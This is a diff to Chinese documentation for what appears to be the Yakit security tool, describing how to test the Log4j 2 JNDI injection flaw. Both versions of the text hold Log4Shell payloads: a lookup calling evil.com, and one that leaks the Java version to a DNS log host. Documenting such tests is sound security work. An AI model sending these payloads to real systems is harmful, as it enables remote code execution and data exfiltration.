@@ -37,7 +37,7 @@ Yakit正在努力编写~
 
 **漏洞描述：**
 
-Apache Log4j 2 是Java语言的日志处理套件，使用极为广泛。在其2.0到2.14.1版本中存在一处JNDI注入漏洞，攻击者在可以控制日志内容的情况下，通过传入类似于${jndi:ldap://evil.com/example}的lookup用于进行JNDI注入，执行任意代码。
+Apache Log4j 2 是Java语言的日志处理套件，使用极为广泛。在其2.0到2.14.1版本中存在一处JNDI注入漏洞，攻击者在可以控制日志内容的情况下，通过传入类似于$&#123;jndi:ldap://evil.com/example&#125;的lookup用于进行JNDI注入，执行任意代码。
 
 **测试过程：**
 
@@ -49,6 +49,6 @@ Apache Log4j 2 是Java语言的日志处理套件，使用极为广泛。在其2
 
 ![](/img/products/yakit/Log4j-5.png)
 
-再发送payload:${jndi:ldap://${sys:java.version}.rowkazpvsx.dnstunnel.run}，在dnslog收到命令执行结果
+再发送payload:$&#123;jndi:ldap://$&#123;sys:java.version&#125;.rowkazpvsx.dnstunnel.run&#125;，在dnslog收到命令执行结果
 
 ![](/img/products/yakit/Log4j-6.png)
